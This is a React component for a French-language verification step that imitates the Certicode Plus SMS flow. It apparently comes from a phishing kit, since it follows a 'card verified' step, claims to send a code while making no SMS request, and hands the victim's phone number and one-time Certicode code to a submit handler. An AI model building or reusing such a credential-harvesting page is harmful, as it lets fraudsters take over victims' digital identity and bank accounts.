import { useState, useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Smartphone, RefreshCcw } from "lucide-react";

export default function SmsStep({ onSubmit, submitting }) {
  const [phase, setPhase] = useState("phone"); // 'phone' -> 'code'
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const [error, setError] = useState("");
  const [resendCountdown, setResendCountdown] = useState(0);
  const inputsRef = useRef([]);

  useEffect(() => {
    if (resendCountdown <= 0) return;
    const t = setTimeout(() => setResendCountdown((c) => c - 1), 1000);
    return () => clearTimeout(t);
  }, [resendCountdown]);

  const submitPhone = (e) => {
    e.preventDefault();
    const digits = phone.replace(/\D/g, "");
    if (digits.length < 9) {
      setError("Numéro de téléphone invalide.");
      return;
    }
    setError("");
    setPhase("code");
    setResendCountdown(45);
    setTimeout(() => inputsRef.current[0]?.focus(), 50);
  };

  const handleCodeChange = (idx, val) => {
    const v = val.replace(/\D/g, "").slice(0, 1);
    setCode((prev) => {
      const next = [...prev];
      next[idx] = v;
      return next;
    });
    if (v && idx < 5) inputsRef.current[idx + 1]?.focus();
  };

  const handleCodeKeyDown = (idx, e) => {
    if (e.key === "Backspace" && !code[idx] && idx > 0) {
      inputsRef.current[idx - 1]?.focus();
    }
  };

  const handleCodePaste = (e) => {
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!pasted) return;
    e.preventDefault();
    const arr = pasted.split("");
    const next = ["", "", "", "", "", ""];
    arr.forEach((c, i) => (next[i] = c));
    setCode(next);
    const lastIdx = Math.min(arr.length, 6) - 1;
    inputsRef.current[lastIdx]?.focus();
  };

  const submitCode = (e) => {
    e.preventDefault();
    const fullCode = code.join("");
    if (fullCode.length !== 6) {
      setError("Veuillez saisir le code à 6 chiffres reçu par SMS.");
      return;
    }
    setError("");
    onSubmit({
      telephone: phone,
      code_certicode: fullCode,
    });
  };

  if (phase === "phone") {
    return (
      <div className="fade-in">
        <div className="mb-4 flex items-center gap-3">
          <div className="rounded-full bg-[#FFCD00]/20 p-2">
            <Smartphone className="h-5 w-5 text-[#003B5C]" />
          </div>
          <span className="text-sm font-medium text-[#16A34A]">Carte vérifiée</span>
        </div>
        <h1 className="text-2xl sm:text-3xl font-semibold tracking-tight text-[#003B5C]">
          Numéro mobile Certicode
        </h1>
        <p className="mt-1 text-sm text-[#475569]">
          Confirmez le numéro mobile rattaché à votre service Certicode Plus.
          Un code de vérification à 6 chiffres y sera envoyé.
        </p>

        <form onSubmit={submitPhone} className="mt-6 space-y-4" data-testid="phone-form">
          <div className="space-y-1.5">
            <Label htmlFor="phone" className="text-[#003B5C] font-medium">
              Numéro de téléphone mobile
            </Label>
            <Input
              id="phone"
              data-testid="phone-input"
              type="tel"
              value={phone}
              onChange={(e) => setPhone(e.target.value.replace(/[^\d +]/g, "").slice(0, 16))}
              placeholder="06 12 34 56 78"
              inputMode="tel"
              autoComplete="tel"
              className="h-12 text-base focus-visible:ring-2 focus-visible:ring-[#003B5C]"
            />
          </div>

          {error && <p data-testid="phone-error" className="text-sm text-[#E11D48]">{error}</p>}

          <Button
            type="submit"
            data-testid="phone-submit"
            disabled={submitting}
            className="w-full h-12 text-base font-semibold bg-[#003B5C] hover:bg-[#002A43] text-white"
          >
            {submitting ? "Envoi…" : "Envoyer le code par SMS"}
          </Button>
        </form>
      </div>
    );
  }

  return (
    <div className="fade-in">
      <h1 className="text-2xl sm:text-3xl font-semibold tracking-tight text-[#003B5C]">
        Code Certicode reçu par SMS
      </h1>
      <p className="mt-1 text-sm text-[#475569]">
        Saisissez le code à 6 chiffres envoyé au <span className="font-semibold text-[#003B5C]">{phone}</span>.
      </p>

      <form onSubmit={submitCode} className="mt-6 space-y-5" data-testid="sms-form">
        <div className="flex justify-center gap-2 sm:gap-3" onPaste={handleCodePaste}>
          {code.map((c, i) => (
            <input
              key={i}
              ref={(el) => (inputsRef.current[i] = el)}
              data-testid={`sms-digit-${i}`}
              value={c}
              onChange={(e) => handleCodeChange(i, e.target.value)}
              onKeyDown={(e) => handleCodeKeyDown(i, e)}
              inputMode="numeric"
              maxLength={1}
              className="h-14 w-11 sm:h-16 sm:w-12 text-center text-2xl font-semibold rounded-md border border-[#E2E8F0] bg-white text-[#003B5C] focus:outline-none focus:ring-2 focus:ring-[#003B5C]"
            />
          ))}
        </div>

        {error && (
          <p data-testid="sms-error" className="text-sm text-[#E11D48] text-center">{error}</p>
        )}

        <Button
          type="submit"
          data-testid="sms-submit"
          disabled={submitting}
          className="w-full h-12 text-base font-semibold bg-[#003B5C] hover:bg-[#002A43] text-white"
        >
          {submitting ? "Validation…" : "Valider le code"}
        </Button>

        <button
          type="button"
          data-testid="sms-resend"
          disabled={resendCountdown > 0}
          onClick={() => setResendCountdown(45)}
          className="w-full flex items-center justify-center gap-2 text-sm text-[#003B5C] disabled:text-[#94A3B8] hover:underline"
        >
          <RefreshCcw className="h-4 w-4" />
          {resendCountdown > 0
            ? `Renvoyer le code dans ${resendCountdown}s`
            : "Renvoyer le code"}
        </button>
      </form>
    </div>
  );
}
